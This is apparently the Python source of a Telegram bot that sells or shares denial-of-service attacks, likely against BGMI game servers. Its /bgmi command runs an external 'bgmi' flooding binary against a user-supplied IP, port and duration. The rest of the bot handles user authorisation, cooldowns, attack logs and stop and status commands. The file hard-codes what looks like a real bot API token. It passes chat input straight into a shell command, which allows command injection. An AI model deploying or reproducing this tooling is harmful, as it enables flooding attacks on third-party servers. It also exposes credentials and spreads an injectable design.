import os
import subprocess
import datetime
import time
import telebot
import sys

API_TOKEN = '7295287836:AAEAyd6RinkHcJtAfq7cjF_dQKEZr0_xTLw'
bot = telebot.TeleBot(API_TOKEN)

admin_id = ['6904449442']  # List of admin user IDs
allowed_user_ids = set(admin_id)
LOG_FILE = "command_logs.txt"
bgmi_cooldown = {}
attack_process = None
start_time = time.time()

# Function to log commands
def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"{datetime.datetime.now()} - User: {user_id} started attack on {target}:{port} for {time} seconds\n")

# Function to start attack and send response message
def start_attack_reply(message, target, port, time):
    global attack_process
    user_id = str(message.chat.id)
    command = f"./bgmi {target} {port} {time} 500"
    try:
        attack_process = subprocess.Popen(command, shell=True)
        response = f"BGMI Attack Started. Target: {target} Port: {port} Time: {time}"
    except Exception as e:
        response = f"Error starting attack: {e}"
    bot.reply_to(message, response)

# Command handler to display user ID
@bot.message_handler(commands=['id'])
def handle_id(message):
    user_id = str(message.chat.id)
    bot.reply_to(message, f"Your ID: {user_id}")

# Command handler for attack
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global attack_process

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 5081:
                response = "Error: Time interval must be less than 80."
            else:
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."

    bot.reply_to(message, response)

# Command handler to stop an ongoing attack
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_process

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if attack_process and attack_process.poll() is None:
            attack_process.terminate()
            attack_process = None
            response = "BGMI Attack Stopped Successfully ✅"
        else:
            response = "No ongoing attack to stop ❌"
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."

    bot.reply_to(message, response)

# Command handler for help
@bot.message_handler(commands=['help', 'start'])
def handle_help(message):
    user_id = str(message.chat.id)
    response = """
    ✅ BGMI Bot Commands:
    /bgmi <target> <port> <time> - Start an attack
    /stop - Stop the ongoing attack
    /id - Get your chat ID
    /mylogs - Show your command logs
    /rules - Show rules
    /plan - Show the plan
    /help, /start - Show this help message
    /status - Check the status of the bot and ongoing attack
    /stats - Show usage statistics
    /ping - Check if the bot is responsive
    /uptime - Show bot uptime
    /history - Show command history

    💼 Admin Commands:
    /add <user_id> - Add a user
    /remove <user_id> - Remove a user
    /clearlogs - Clear command logs
    /allusers - Show all authorized users
    /logs - Show recent command logs
    /admincmd - Show admin commands
    /broadcast <message> - Broadcast a message
    /userinfo <user_id> - Get information about a specific user
    /restart - Restart the bot
    """
    bot.reply_to(message, response)

# Command handler for rules
@bot.message_handler(commands=['rules'])
def handle_rules(message):
    response = "🔒 Follow the rules and regulations of the bot."
    bot.reply_to(message, response)

# Command handler for plan
@bot.message_handler(commands=['plan'])
def handle_plan(message):
    response = "📅 Here is the plan for the bot usage."
    bot.reply_to(message, response)

# Command handler for admin commands
@bot.message_handler(commands=['admincmd'])
def handle_admincmd(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = """
        💼 Admin Commands:
        /add <user_id> - Add a user
        /remove <user_id> - Remove a user
        /clearlogs - Clear command logs
        /allusers - Show all authorized users
        /logs - Show recent command logs
        /broadcast <message> - Broadcast a message
        /userinfo <user_id> - Get information about a specific user
        /restart - Restart the bot
        """
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Command handler for broadcasting messages
@bot.message_handler(commands=['broadcast'])
def handle_broadcast(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            broadcast_message = command[1]
            for uid in allowed_user_ids:
                bot.send_message(uid, f"📢 Broadcast: {broadcast_message}")
            response = "Message broadcasted successfully ✅"
        else:
            response = "Please specify a message to broadcast 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# Command handler for showing user logs
@bot.message_handler(commands=['mylogs'])
def handle_mylogs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                log_entries = file.readlines()
                user_logs = [entry for entry in log_entries if user_id in entry]
                if user_logs:
                    response = "📜 Your command logs:\n\n" + "\n".join(user_logs)
                else:
                    response = "No logs found for your commands ❌"
        except FileNotFoundError:
            response = "No logs found ❌"
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."

    bot.reply_to(message, response)

# Command handler to show bot status
@bot.message_handler(commands=['status'])
def handle_status(message):
    global attack_process

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        status_message = "Bot Status:\n"
        if attack_process and attack_process.poll() is None:
            status_message += "✅ Current attack is ongoing.\n"
        else:
            status_message += "❌ No ongoing attack.\n"
        bot.reply_to(message, status_message)
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."
        bot.reply_to(message, response)

# Command handler to show bot statistics
@bot.message_handler(commands=['stats'])
def handle_stats(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        num_attacks = 0
        num_users = len(allowed_user_ids)
        
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.readlines()
                num_attacks = sum(1 for log in logs if '/bgmi' in log)
        except FileNotFoundError:
            num_attacks = 0
        
        response = f"""
        📊 Bot Statistics:
        - Total attacks initiated: {num_attacks}
        - Total authorized users: {num_users}
        """
        bot.reply_to(message, response)
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."
        bot.reply_to(message, response)

# Command handler to check if the bot is responsive
@bot.message_handler(commands=['ping'])
def handle_ping(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        bot.reply_to(message, "🏓 Pong! The bot is responsive.")
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."
        bot.reply_to(message, response)

# Command handler to get information about a specific user (admin only)
@bot.message_handler(commands=['userinfo'])
def handle_userinfo(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_check = command[1]
            if user_to_check in allowed_user_ids:
                try:
                    user_info = bot.get_chat(int(user_to_check))
                    response = f"""
                    📋 User Info:
                    - User ID: {user_to_check}
                    - Username: @{user_info.username if user_info.username else 'N/A'}
                    - First Name: {user_info.first_name}
                    - Last Name: {user_info.last_name if user_info.last_name else 'N/A'}
                    """
                except Exception as e:
                    response = f"Error retrieving user info: {e}"
            else:
                response = "User not found in the authorized list ❌."
        else:
            response = "Please specify a user ID to check 😒."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Command handler to restart the bot
@bot.message_handler(commands=['restart'])
def handle_restart(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "🔄 Restarting the bot...")
        os.execl(sys.executable, sys.executable, *sys.argv)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)

# Command handler to show bot uptime
@bot.message_handler(commands=['uptime'])
def handle_uptime(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        uptime_seconds = int(time.time() - start_time)
        uptime_string = str(datetime.timedelta(seconds=uptime_seconds))
        response = f"⏱ Bot Uptime: {uptime_string}"
        bot.reply_to(message, response)
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."
        bot.reply_to(message, response)

# Command handler to show command history
@bot.message_handler(commands=['history'])
def handle_history(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.readlines()
                if logs:
                    response = "📜 Command History:\n\n" + "".join(logs)
                else:
                    response = "No command history found ❌"
        except FileNotFoundError:
            response = "No command history found ❌"
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."
    bot.reply_to(message, response)

# Command handler to add a new user (admin only)
@bot.message_handler(commands=['add'])
def handle_add(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            new_user_id = command[1]
            if new_user_id not in allowed_user_ids:
                allowed_user_ids.add(new_user_id)
                response = f"User {new_user_id} added successfully ✅"
            else:
                response = "User is already in the allowed list ✅"
        else:
            response = "Usage: /add <user_id>"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Command handler to remove a user (admin only)
@bot.message_handler(commands=['remove'])
def handle_remove(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            remove_user_id = command[1]
            if remove_user_id in allowed_user_ids:
                allowed_user_ids.remove(remove_user_id)
                response = f"User {remove_user_id} removed successfully ✅"
            else:
                response = "User not found in the allowed list ❌"
        else:
            response = "Usage: /remove <user_id>"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Command handler to clear command logs (admin only)
@bot.message_handler(commands=['clearlogs'])
def handle_clearlogs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        open(LOG_FILE, 'w').close()
        response = "Logs cleared successfully ✅"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Command handler to show all authorized users (admin only)
@bot.message_handler(commands=['allusers'])
def handle_allusers(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "Authorized users:\n\n" + "\n".join(allowed_user_ids)
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Command handler to show recent command logs (admin only)
@bot.message_handler(commands=['logs'])
def handle_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.readlines()
                if logs:
                    response = "📜 Recent Command Logs:\n\n" + "".join(logs)
                else:
                    response = "No command logs found ❌"
        except FileNotFoundError:
            response = "No command logs found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Start polling
bot.polling()

        